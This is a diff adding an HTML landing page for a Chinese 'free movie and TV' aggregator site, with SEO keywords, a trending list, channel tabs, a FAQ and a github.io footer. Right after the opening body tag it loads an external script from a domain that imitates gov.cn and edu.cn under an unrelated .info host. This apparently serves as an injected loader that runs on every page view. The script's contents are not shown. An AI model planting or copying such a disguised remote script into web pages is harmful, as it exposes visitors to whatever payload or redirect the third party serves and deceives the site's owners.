@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="八戒八戒电影网,bajiebajiedianyingwang,八戒影视,免费电影,在线追剧,影视导航">
+<meta name="description" content="八戒八戒电影网 - 海量影视免费看，电影电视剧动漫综艺一网打尽，八戒影视陪你轻松追剧，尽享观影乐趣。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>八戒八戒电影网 | 海量影视 · 轻松追剧</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+ --bg:#fff9f0;--ink:#2a1f12;--card:#fff;--line:#f0e2cf;
+ --main:#e8621c;--main2:#f59e0b;--deep:#9a3412;--red:#dc2626;--txt:#4a3a26;--dim:#8a7557
+}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--ink);line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px}
+.badge{background:var(--card);border:1px solid var(--line);border-radius:999px;padding:5px 12px;font-size:11px;font-weight:800;color:var(--deep)}
+
+/* HEADER */
+header{position:sticky;top:0;z-index:70;background:rgba(255,252,246,.96);backdrop-filter:blur(10px);border-bottom:2px solid var(--main)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:66px}
+.logo{display:flex;align-items:center;gap:10px}
+.logo .pig{width:40px;height:40px;border-radius:14px;background:linear-gradient(135deg,var(--main),var(--main2));display:flex;align-items:center;justify-content:center;font-size:21px;box-shadow:0 5px 14px rgba(232,98,28,.35);transform:rotate(-6deg)}
+.logo b{font-size:16px;font-weight:900;line-height:1.15}
+.logo b i{font-style:normal;color:var(--main)}
+.logo small{display:block;font-size:9px;color:var(--dim);font-weight:600;letter-spacing:1px}
+nav{display:none;gap:2px}
+nav a{padding:8px 15px;border-radius:10px;font-size:13px;font-weight:800;color:var(--txt);transition:.2s}
+nav a:hover,nav a.on{background:var(--main);color:#fff}
+.btn-hi{display:none;background:var(--deep);color:#fff;padding:9px 19px;border-radius:10px;font-size:12.5px;font-weight:900}
+.tog{width:42px;height:42px;border-radius:12px;background:var(--main);color:#fff;font-size:19px;border:none;cursor:pointer}
+.drawer{display:none;background:#fffdf8;border-bottom:2px solid var(--main)}
+.drawer.on{display:block}
+.drawer a{display:block;padding:14px 16px;border-bottom:1px solid var(--line);font-weight:800;font-size:14px}
+main{padding-top:2px}
+
+/* HERO */
+.hero{position:relative;padding:52px 0 60px;background:radial-gradient(620px 320px at 88% 8%,rgba(245,158,11,.28),transparent),radial-gradient(520px 300px at 8% 90%,rgba(232,98,28,.18),transparent),linear-gradient(180deg,#fff4e2,#fff9f0)}
+.hero .wrap{position:relative;z-index:2}
+.hero h1{font-size:29px;font-weight:900;line-height:1.4;margin-bottom:14px}
+.hero h1 em{font-style:normal;color:var(--main)}
+.hero p{font-size:13.5px;color:var(--txt);max-width:510px;margin-bottom:22px}
+.hbtns{display:flex;gap:11px;flex-wrap:wrap;margin-bottom:24px}
+.hbtns a:first-child{background:linear-gradient(135deg,var(--main),var(--main2));color:#fff;padding:12px 28px;border-radius:12px;font-weight:900;font-size:14px;box-shadow:0 6px 16px rgba(232,98,28,.35)}
+.hbtns a:last-child{border:2px solid var(--line);color:var(--deep);padding:12px 22px;border-radius:12px;font-weight:800;font-size:13.5px}
+.kw{display:flex;gap:7px;flex-wrap:wrap}
+.kw a{font-size:11.5px}
+
+/* SCROLL TICKER LIST DOM */
+.sec{padding:48px 0}
+.st{display:flex;align-items:flex-end;justify-content:space-between;gap:10px;margin-bottom:20px}
+.st h2{font-size:19px;font-weight:900;display:flex;align-items:center;gap:8px}
+.st h2 span{font-size:12px;background:var(--main);color:#fff;padding:2px 9px;border-radius:6px;font-weight:800}
+.st a{font-size:11.5px;color:var(--deep);font-weight:800}
+.ticker{border:2px solid var(--line);border-radius:16px;overflow:hidden;background:var(--card)}
+.tk{display:grid;grid-template-columns:auto 1fr auto auto;gap:12px;align-items:center;padding:13px 16px;border-bottom:1px solid var(--line);transition:.2s}
+.tk:last-child{border-bottom:none}
+.tk:hover{background:#fff4e2}
+.tk .no{width:30px;height:30px;border-radius:9px;background:var(--bg);color:var(--deep);font-weight:900;font-size:13px;display:flex;align-items:center;justify-content:center}
+.tk b{font-size:13.5px;font-weight:800}
+.tk small{display:block;font-size:10.5px;color:var(--dim)}
+.tk .tp{font-size:10.5px;color:var(--main);font-weight:800;border:1px solid var(--line);padding:3px 8px;border-radius:6px}
+.tk .rt{font-size:12px;font-weight:900;color:var(--deep);white-space:nowrap}
+
+/* SWITCH TABS DOM */
+.tabs{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
+.tab{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 14px;position:relative;transition:.25s}
+.tab:hover{border-color:var(--main);transform:translateY(-3px);box-shadow:0 10px 24px rgba(232,98,28,.14)}
+.tab i{font-style:normal;font-size:26px;display:block;margin-bottom:8px}
+.tab b{font-size:14px;font-weight:900}
+.tab p{font-size:10.5px;color:var(--dim);margin-top:4px}
+.tab .ct{position:absolute;right:12px;top:12px;font-size:10px;font-weight:900;color:var(--main2);background:var(--bg);padding:2px 7px;border-radius:6px}
+
+/* FAQ ACCORDION DOM */
+.faq{border:2px solid var(--line);border-radius:16px;overflow:hidden;background:var(--card)}
+.fq{padding:16px 18px;border-bottom:1px solid var(--line)}
+.fq:last-child{border-bottom:none}
+.fq .q{display:flex;align-items:center;gap:10px;font-weight:900;font-size:13.5px}
+.fq .q .qm{width:24px;height:24px;border-radius:7px;background:var(--main);color:#fff;font-size:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.fq .a{margin-top:9px;padding-left:34px;font-size:12px;color:var(--txt);line-height:1.85}
+
+footer{background:var(--ink);color:#e8d9c4;padding:42px 0 24px}
+.ft{display:grid;grid-template-columns:1fr;gap:24px}
+.ft .a b{font-size:16px;font-weight:900}
+.ft .a p{font-size:12px;color:#b9a88e;margin-top:7px}
+.ft .a .u{color:var(--main2);font-size:12px;word-break:break-all;display:block;margin-top:9px}
+.cols{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+.cols a{font-size:12.5px;color:#cbb89c;font-weight:600}
+.cols a:hover{color:var(--main2)}
+.cp{margin-top:26px;padding-top:16px;border-top:1px solid #4a3a26;font-size:10.5px;color:#9a8a70;line-height:2;text-align:center}
+
+#top{position:fixed;right:14px;bottom:18px;z-index:90;width:46px;height:46px;border-radius:50%;background:var(--main);color:#fff;font-size:17px;display:none;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 6px 18px rgba(232,98,28,.4)}
+#top.on{display:flex}
+
+@media(min-width:600px){
+ .tabs{grid-template-columns:repeat(3,1fr)}
+ .kw{display:inline-flex}
+}
+@media(min-width:820px){
+ nav{display:flex}.tog{display:none}.btn-hi{display:inline-block}
+ .hero h1{font-size:46px;max-width:640px}
+ .hero p{font-size:15px}
+ .tabs{grid-template-columns:repeat(3,1fr)}
+ .ft{grid-template-columns:1.4fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo"><div class="pig">🐷</div><div><b>八戒<i>八戒电影网</i></b><small>BAJIE · MOVIE</small></div></div>
+    <nav>
+      <a href="#home" class="on">首页</a>
+      <a href="#hot">热播榜单</a>
+      <a href="#cat">频道大厅</a>
+      <a href="#faq">观影指南</a>
+    </nav>
+    <a href="#" class="btn-hi">免费追剧</a>
+    <button class="tog" onclick="document.getElementById('dr').classList.toggle('on')">☰</button>
+  </div>
+  <div class="drawer" id="dr">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#hot" onclick="this.parentNode.classList.remove('on')">热播榜单</a>
+    <a href="#cat" onclick="this.parentNode.classList.remove('on')">频道大厅</a>
+    <a href="#faq" onclick="this.parentNode.classList.remove('on')">观影指南</a>
+  </div>
+</header>
+
+<main>
+
+<!-- HERO -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <h1>八戒八戒，<br>好片<em>吃个够</em>！</h1>
+    <p>海量影视免费看，电影、剧集、动漫、综艺一网打尽。不用挑花眼，八戒帮你精选好内容，轻松追剧每一天。</p>
+    <div class="hbtns">
+      <a href="#">🐷 开始吃片</a>
+      <a href="#">📺 看看热播</a>
+    </div>
+    <div class="kw">
+      <a href="#" class="badge"># 动作大片</a>
+      <a href="#" class="badge"># 喜剧搞笑</a>
+      <a href="#" class="badge"># 悬疑烧脑</a>
+      <a href="#" class="badge"># 爱情甜宠</a>
+      <a href="#" class="badge"># 国漫崛起</a>
+    </div>
+  </div>
+</section>
+
+<!-- TICKER LIST -->
+<section class="sec" id="hot">
+  <div class="wrap">
+    <div class="st"><h2>🔥 热播榜单 <span>TOP 8</span></h2><a href="#">完整榜单</a></div>
+    <div class="ticker">
+      <a href="#" class="tk"><div class="no">1</div><div><b>封神·降魔篇</b><small>动作 / 电影 · 今日 12.6 万人在看</small></div><span class="tp">大片</span><span class="rt">9.8</span></a>
+      <a href="#" class="tk"><div class="no">2</div><div><b>赘婿当道</b><small>喜剧 / 36集 · 笑到停不下来</small></div><span class="tp">热播</span><span class="rt">9.6</span></a>
+      <a href="#" class="tk"><div class="no">3</div><div><b>暗夜追凶</b><small>悬疑 / 24集 · 全网热议</small></div><span class="tp">悬疑</span><span class="rt">9.5</span></a>
+      <a href="#" class="tk"><div class="no">4</div><div><b>一念关山</b><small>古装 / 40集 · 武侠热血</small></div><span class="tp">古装</span><span class="rt">9.3</span></a>
+      <a href="#" class="tk"><div class="no">5</div><div><b>你好，星期六</b><small>综艺 / 全季 · 周末解压</small></div><span class="tp">综艺</span><span class="rt">9.1</span></a>
+      <a href="#" class="tk"><div class="no">6</div><div><b>斗破苍穹·年番</b><small>动漫 / 连载中 · 国漫之光</small></div><span class="tp">动漫</span><span class="rt">9.0</span></a>
+      <a href="#" class="tk"><div class="no">7</div><div><b>甜甜的恋爱</b><small>爱情 / 20集 · 甜度爆表</small></div><span class="tp">爱情</span><span class="rt">8.8</span></a>
+      <a href="#" class="tk"><div class="no">8</div><div><b>舌尖上的中国</b><small>纪录 / 8集 · 治愈深夜</small></div><span class="tp">纪录</span><span class="rt">8.7</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- TABS -->
+<section class="sec" id="cat" style="padding-top:0">
+  <div class="wrap">
+    <div class="st"><h2>🎬 频道大厅</h2><a href="#">更多频道</a></div>
+    <div class="tabs">
+      <a href="#" class="tab"><span class="ct">3,860</span><i>🎥</i><b>电影大片</b><p>院线热映 · 经典老片 · 海外佳片</p></a>
+      <a href="#" class="tab"><span class="ct">1,240</span><i>📺</i><b>热播剧集</b><p>同步追更 · 港台日韩 · 美剧英剧</p></a>
+      <a href="#" class="tab"><span class="ct">860</span><i>🎌</i><b>动漫新番</b><p>新番连载 · 经典完结 · 国漫专区</p></a>
+      <a href="#" class="tab"><span class="ct">520</span><i>🎤</i><b>综艺娱乐</b><p>爆款综艺 · 深度纪录 · 真人秀</p></a>
+      <a href="#" class="tab"><span class="ct">2,100</span><i>😂</i><b>喜剧专区</b><p>爆笑合集 · 搞笑短片 · 相声小品</p></a>
+      <a href="#" class="tab"><span class="ct">640</span><i>🏆</i><b>高分精选</b><p>观众力荐 · 口碑佳作 · 必看清单</p></a>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="sec" id="faq" style="padding-top:0">
+  <div class="wrap">
+    <div class="st"><h2>💡 观影指南</h2><a href="#">更多帮助</a></div>
+    <div class="faq">
+      <div class="fq"><div class="q"><span class="qm">Q1</span>八戒八戒电影网都看什么？</div><div class="a">覆盖电影、电视剧、动漫、综艺、纪录片等全品类影视内容，院线大片与热播剧集同步更新，一站满足全家观影需求。</div></div>
+      <div class="fq"><div class="q"><span class="qm">Q2</span>需要注册登录才能看吗？</div><div class="a">无需复杂注册，打开页面即可直接观看，支持手机、平板、电脑多端自适应，随时随地轻松追剧。</div></div>
+      <div class="fq"><div class="q"><span class="qm">Q3</span>更新频率如何？</div><div class="a">每日持续更新热播内容与最新上线影片，热门剧集第一时间同步，让你不再错过任何精彩剧情。</div></div>
+      <div class="fq"><div class="q"><span class="qm">Q4</span>支持搜索想看的内容吗？</div><div class="a">支持片名、类型、演员等多维检索，热门关键词一目了然，想看什么一搜就有，告别挑片困难。</div></div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="a">
+        <b>🐷 八戒八戒电影网</b>
+        <p>海量影视免费看，电影电视剧动漫综艺一网打尽，八戒陪你轻松追剧每一天。</p>
+        <span class="u">https://bajiebajiedianyingwang-wap.github.io</span>
+      </div>
+      <div>
+        <div class="cols">
+          <a href="#">首页</a><a href="#">热播榜单</a>
+          <a href="#">频道大厅</a><a href="#">观影指南</a>
+          <a href="#">免费追剧</a><a href="#">关于我们</a>
+        </div>
+      </div>
+    </div>
+    <div class="cp">© 2026 八戒八戒电影网 bajiebajiedianyingwang · 保留所有权利<br>本站为影视信息聚合导航平台，倡导正版观看，相关版权归原作者所有</div>
+  </div>
+</footer>
+
+<div id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+window.addEventListener('scroll',function(){document.getElementById('top').classList.toggle('on',window.scrollY>450);});
+</script>
+</body>
+</html>
